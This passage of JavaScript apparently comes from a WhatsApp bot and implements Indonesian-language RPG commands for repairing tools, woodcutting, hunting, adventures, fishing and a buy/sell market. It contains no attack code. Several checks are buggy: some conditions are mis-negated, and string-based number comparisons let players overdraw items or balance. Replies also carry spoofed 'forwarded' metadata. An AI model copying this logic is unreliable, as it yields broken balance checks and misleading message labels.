								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			break
			case 'repair':
			case 'rawat': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let rawat = args[0]
				switch (rawat) {
					case 'kapal':
						if (!rpgdb[m.sender].kapal) return m.warning(`*🙃 Kamu Gak Punya Kapal*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapal`)
						if (!rpgdb[m.sender].darahkapal < 1) return m.reply(`*😑 Kapal Kamu Masih Bagus*`)
						if (rpgdb[m.sender].besi < 5) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *5 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						if (rpgdb[m.sender].kayu < 10) return m.reply(`*Kayu Kamu (${rpgdb[m.sender].kayu}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *10 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
						rpgdb[m.sender].besi -= 5
						rpgdb[m.sender].kayu -= 10
						rpgdb[m.sender].darahkapal = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break
					case 'pickaxe':
						if (!rpgdb[m.sender].pickaxe) return m.warning(`*🙃 Kamu Gak Punya Pickaxe*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pickaxe`)
						if (!rpgdb[m.sender].darahpickaxe < 1) return m.reply(`*😑 Pickaxe Kamu Masih Bagus*`)
						if (rpgdb[m.sender].besi < 1) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pickaxe*\n\nUntuk Perbaikan Pickaxe Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						rpgdb[m.sender].besi -= 1
						rpgdb[m.sender].darahpickaxe = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break
					case 'kapak':
						if (!rpgdb[m.sender].kapak) return m.warning(`*🙃 Kamu Gak Punya Kapak*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapak`)
						if (!rpgdb[m.sender].darahkapak < 1) return m.reply(`*😑 Kapak Kamu Masih Bagus*`)
						if (rpgdb[m.sender].besi < 1) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapak*\n\nUntuk Perbaikan Kapak Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						rpgdb[m.sender].besi -= 1
						rpgdb[m.sender].darahkapak = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break
					case 'armor':
						if (!rpgdb[m.sender].bzirah) return m.warning(`*🙃 Kamu Gak Punya Baju Zirah*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Baju Zirah`)
						if (!rpgdb[m.sender].darahbzirah < 1) return m.reply(`*😑 Baju Zirah Kamu Masih Bagus*`)
						if (rpgdb[m.sender].besi < 2) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Perbaikan Armor*\n\nUntuk Perbaikan Armor Diperlukan *2 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						rpgdb[m.sender].besi -= 2
						rpgdb[m.sender].darahbzirah = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break
					case 'pedang':
						if (!rpgdb[m.sender].pedang) return m.warning(`*🙃 Kamu Gak Punya Pedang*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pedang`)
						if (!rpgdb[m.sender].darahpedang < 1) return m.reply(`*😑 Pedang Kamu Masih Bagus*`)
						if (rpgdb[m.sender].besi < 1) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pedang*\n\nUntuk Perbaikan Pedang Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						rpgdb[m.sender].besi -= 1
						rpgdb[m.sender].darahpedang = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break
					default:
						let teks = `---------- » *PERBAIKAN* « ----------

*Pilih Barang Yang*
*Akan Di perbaiki*
- kapal
- pickaxe
- kapak
- armor
- pedang

*Contoh:*
${prefix + command} kapak

`
						vreden.sendMessage(m.chat, {
							text: teks,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 9999,
								isForwarded: true,
								forwardedNewsletterMessageInfo: {
									newsletterJid: idsaluran,
									serverMessageId: null,
									newsletterName: `${namasaluran}`
								},
								externalAdReply: {
									title: "RPG TOOLS REPAIR",
									body: 'Repairs and upgrades tools',
									thumbnailUrl: "https://telegra.ph/file/08e78c20afd16dcebb33d.jpg",
									sourceUrl: "-",
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						}, {
							quoted: m
						})
				}
			}
			break
			case 'menebang':
			case 'nebang': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!rpgdb[m.sender].kapak) return m.reply('Kamu Tidak Memiliki Kapak, Silahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
				if (rpgdb[m.sender].darahkapak < 1) return m.reply('☹️Kapak Kamu Rusak\nRawat Dulu Alat Tebangmu\n\nKetik _.rawat_')
				let kayu = await randomNomor(0, 20)
				rpgdb[m.sender].kayu += kayu
				rpgdb[m.sender].darahkapak -= 20
				m.sendForward(`*🌳 MENEBANG POHON 🌳*

Item Yang Didapat:
- Kayu: ${kayu} (Hasil Tebang)
- Kapak: -20 Healthy (Digunakan)

`)
			}
			break
			case 'berburu': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let domba = await randomNomor(0, 10)
				let sapi = await randomNomor(0, 10)
				let ayam = await randomNomor(0, 10)
				let buulu = domba + sapi + ayam
				let bulu = buulu / 2
				let waktuu = await clockString(new Date() - rpgdb[m.sender].burutime)
				if (new Date() - rpgdb[m.sender].burutime < 7200000) return m.reply(`Kamu Baru Saja Berburu ${waktuu} Yang Lalu, Silahkan Tunggu 2 Jam Setelah Terakhir Kali Berburu`)
				rpgdb[m.sender].burutime = new Date * 1
				rpgdb[m.sender].domba += domba
				rpgdb[m.sender].sapi += sapi
				rpgdb[m.sender].ayam += ayam
				rpgdb[m.sender].bulu += bulu
				m.sendForward(`*🏹 BERBURU 🏹*

Item Yang Didapat:
- Domba: ${domba}
- Sapi: ${sapi}
- Ayam: ${ayam}
- Bulu: ${bulu} (Hasil Pencabutan)

_Tunggu 2 jam untuk_
_berburu berikutnya_

`)
			}
			break
			case 'adventure': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (rpgdb[m.sender].darahuser < 1) return m.reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
				var tuju = args.join(" ")
				let obj = ["villager", "zombie", "ghasts", "wither", "skeleton", "wolves"]
				let obje = await pickRandom(obj)
				let kayu = await randomNomor(15)
				let besi = await randomNomor(10)
				let rank = await randomNomor(100)
				let saldo = await randomNomor(2000)
				if (tuju === "savanah") {
					rpgdb[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/1b27b199f440cd69be0aa.jpg"
					let {
						key
					} = await vreden.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
					await vreden.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await vreden.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
					await vreden.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					rpgdb[m.sender].kayu += kayu
					rpgdb[m.sender].besi += besi
					rpgdb[m.sender].rank += rank
					rpgdb[m.sender].saldo += saldo
				} else if (tuju === "dessert") {
					rpgdb[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/760e27568c0b2ccf07231.jpg"
					let {
						key
					} = await vreden.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
					await vreden.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await vreden.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
					await vreden.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					rpgdb[m.sender].kayu += kayu
					rpgdb[m.sender].besi += besi
					rpgdb[m.sender].rank += rank
					rpgdb[m.sender].saldo += saldo
				} else if (tuju === "boreal forest") {
					rpgdb[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/1a528cf0c7e1eb0e74976.jpg"
					let {
						key
					} = await vreden.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
					await vreden.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await vreden.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
					await vreden.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					rpgdb[m.sender].kayu += kayu
					rpgdb[m.sender].besi += besi
					rpgdb[m.sender].rank += rank
					rpgdb[m.sender].saldo += saldo
				} else if (tuju === "tropical forest") {
					rpgdb[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/bbc4d8eb053479d69e5f7.jpg"
					let {
						key
					} = await vreden.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
					await vreden.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await vreden.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
					await vreden.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					rpgdb[m.sender].kayu += kayu
					rpgdb[m.sender].besi += besi
					rpgdb[m.sender].rank += rank
					rpgdb[m.sender].saldo += saldo
				} else {
					let thumbadv = "https://telegra.ph/file/6b9482a4ed6bd79c7a03e.jpg"
					let adv = `---------- » *ADVENTURE* « ----------

*Pilih Lokasi Jelajahmu📍*
- savanah
- dessert
- boreal forest
- tropical forest

*Contoh:*
.adventure savanah

`
					await vreden.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			break
			case 'memancing':
			case 'mancing': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (rpgdb[m.sender].darahuser < 1) return m.reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
				let ikan = await randomNomor(0, 20)
				rpgdb[m.sender].ikan += ikan
				rpgdb[m.sender].darahuser -= 20
				let thum = ["https://telegra.ph/file/9b1f618a826fe7b3bed3e.jpg", "https://telegra.ph/file/2e772e9732c88e153e812.jpg", "https://telegra.ph/file/872b36a0dd7b6843f24da.jpg", "https://telegra.ph/file/562adf3d43cde4d355e76.jpg", "https://telegra.ph/file/7d641d46e96e9aace01dd.jpg"]
				let thumn = await pickRandom(thum)
				let {
					key
				} = await vreden.sendMessage(m.chat, {
					text: 'Sedang Memancing...'
				}, {
					quoted: m
				})
				await sleep(5000)
				await vreden.sendMessage(m.chat, {
					text: `Memperoleh Hasil...`,
					edit: key
				});
				await sleep(5000)
				let txt = `--------- » *MEMANCING* « ---------

Berhasil mendapatkan ${ikan} ikan

_Stamina berkurang -20_

`
				vreden.sendMessage(m.chat, {
					text: txt,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "RPG - FISHING",
							body: 'Looking for fish catch',
							thumbnailUrl: thumn,
							sourceUrl: "tes",
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
			}
			break
			/*case 'battle': {
			let ketahananuser = 
			let ketahananlawan = 
			}
			break*/
			case 'sell':
			case 'jual': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let jual = args[0]
				switch (jual) {
					case 'emas': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2500)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].emas}` < `${jumlh}`) return m.reply(`*Emas Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].emas -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Emas: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'besi': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1500)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].besi}` < `${jumlh}`) return m.reply(`*Besi Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].besi -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Besi: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'batubara': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1000)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].batubara}` < `${jumlh}`) return m.reply(`*Batu Bara Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].batubara -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Batu Bara: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'perak': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].perak}` < `${jumlh}`) return m.reply(`*Perak Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].perak -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Perak: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'kayu': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].kayu}` < `${jumlh}`) return m.reply(`*Kayu Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].kayu -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Kayu: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'ayam': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].ayam}` < `${jumlh}`) return m.reply(`*Ayam Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].ayam -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Ayam: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'sapi': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 3000)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].sapi}` < `${jumlh}`) return m.reply(`*Sapi Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].sapi -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Sapi: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'domba': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].domba}` < `${jumlh}`) return m.reply(`*Domba Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].domba -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Domba: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'ikan': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 200)
						let jumlh = Number(args[1])
						if (`${rpgdb[m.sender].ikan}` < `${jumlh}`) return m.reply(`*Ikan Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo += uang
						rpgdb[m.sender].ikan -= parseInt(args[1])
						m.sendForward(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Ikan: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					default:
						let teks = `------- » *🛍️ MARKET 🛍️* « -------

*Pilih Barang Yang*
*Akan Di Jual*
- emas
- besi
- batubara
- perak
- kayu
- ayam
- sapi
- domba
- ikan

*Contoh:*
${prefix + command} ikan

`
						vreden.sendMessage(m.chat, {
							text: teks,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 9999,
								isForwarded: true,
								forwardedNewsletterMessageInfo: {
									newsletterJid: idsaluran,
									serverMessageId: null,
									newsletterName: `${namasaluran}`
								},
								externalAdReply: {
									title: "SELLING MARKET",
									body: 'Sell goods to earn money',
									thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
									sourceUrl: "-",
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						}, {
							quoted: m
						})
				}
			}
			break
			case 'buy':
			case 'beli': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let beli = args[0]
				switch (beli) {
					case 'emas': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2500)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].emas += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Emas: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'besi': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1500)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].besi += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Besi: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'batubara': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1000)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].batubara += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Batu Bara: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'perak': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].perak += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Perak: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'kayu': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].kayu += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Kayu: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'ayam': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].ayam += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Ayam: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'sapi': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 3000)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].sapi += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Sapi: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'domba': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].domba += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Domba: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

